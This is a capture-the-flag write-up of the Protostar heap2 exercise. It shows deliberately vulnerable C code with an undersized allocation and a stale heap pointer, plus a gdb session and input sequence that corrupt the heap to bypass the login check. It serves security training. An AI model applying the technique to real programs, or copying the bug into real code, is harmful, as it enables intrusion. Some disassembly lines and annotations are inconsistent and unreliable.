#### Protostar Heap2 

##### About
This level examines what can happen when heap pointers are stale.  
  
This level is completed when you see the “you have logged in already!” message  
  
This level is at /opt/protostar/bin/heap2

##### Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

struct auth {
  char name[32];
  int auth;
};

struct auth *auth;
char *service;

int main(int argc, char **argv)
{
  char line[128];

  while(1) {
      printf("[ auth = %p, service = %p ]\n", auth, service);

      if(fgets(line, sizeof(line), stdin) == NULL) break;
      
      if(strncmp(line, "auth ", 5) == 0) {
          auth = malloc(sizeof(auth));
          memset(auth, 0, sizeof(auth));
          if(strlen(line + 5) < 31) {
              strcpy(auth->name, line + 5);
          }
      }
      if(strncmp(line, "reset", 5) == 0) {
          free(auth);
      }
      if(strncmp(line, "service", 6) == 0) {
          service = strdup(line + 7);
      }
      if(strncmp(line, "login", 5) == 0) {
          if(auth->auth) {
              printf("you have logged in already!\n");
          } else {
              printf("please enter your password\n");
          }
      }
  }
}
```

To solve this challenge, we should set the value of auth->auth to non-zero.  
  
The address of auth->auth should be auth+32 , and let's see how this program works.

##### Solution
```
$ gdb heap2
......
(gdb) disas main
Dump of assembler code for function main:
......
0x080489a7 <+115>:  movl   $0x4,(%esp)
0x080489ae <+122>:  call   0x804916a <malloc>            ; auth = malloc(4); // What? Only 4 bytes?
0x080489b3 <+127>:  mov    0x804b5f4,%eax
0x080489b8 <+132>:  mov    eax,ds:0x804b5f4
0x080489bd <+137>:  movl   $0x4,0x8(%esp)   
0x080489c5 <+145>:  movl   $0x0,0x4(%esp)
0x080489cd <+153>:  mov    %eax,(%esp)
0x080489d0 <+156>:  call   0x80487bc <memset@plt>        ; memset(auth, 0, sizeof(auth));
0x080489d5 <+161>:  lea    %eax,0x10(%esp)
0x080489d9 <+165>:  add    $0x5,%eax
0x080489dc <+168>:  mov    %eax,(%esp)
0x080489df <+171>:  call   0x80487fc <strlen@plt>
0x080489e4 <+176>:  cmp    $0x1e,%eax                    ; if(strlen(line + 5) < 30)  //30? Why not 31?
0x080489e7 <+179>:  ja     0x8048a01 <main+205>                 
0x080489e9 <+181>:  lea    0x10(%esp),%eax
0x080489ed <+185>:  lea    0x5(%eax),%edx
0x080489f0 <+188>:  mov    0x804b5f4,%eax
0x080489f5 <+193>:  mov    %edx,0x4(%esp)
0x080489f9 <+197>:  mov    %eax,(%esp)
0x080489fc <+200>:  call   0x804880c <strcpy@plt>        ; strcpy(auth->name, line + 5);
......
(gdb) quit

$ ./heap2
[ auth = (nil), service = (nil) ]
auth AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[ auth = 0x804c008, service = (nil) ]
service BBBB
[ auth = 0x804c008, service = 0x804c018 ]
login
please enter your password
[ auth = 0x804c008, service = 0x804c018 ]
service BBBB
[ auth = 0x804c008, service = 0x804c028 ]
login
you have logged in already!
```

##### Reference
<https://thesprawl.org/research/exploit-exercises-protostar-heap/#heap-2>
